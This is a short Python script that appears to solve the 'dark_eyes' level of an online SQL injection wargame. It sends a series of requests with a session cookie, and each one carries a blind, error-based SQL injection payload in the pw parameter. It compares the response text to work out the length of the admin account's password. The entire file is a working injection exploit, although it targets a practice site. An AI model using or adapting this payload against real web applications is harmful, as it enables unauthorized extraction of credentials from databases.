import requests

pw_len = ""

for num in range(1,50):
    url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id ='admin' and (select 1 union select length(pw)="+str(num)+")%23 "
    cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
    res = requests.get(url,cookies= cookies)
    if 'select id from prob_dark_eyes' in res.text:
        pw_len = num
        print(pw_len)
        break
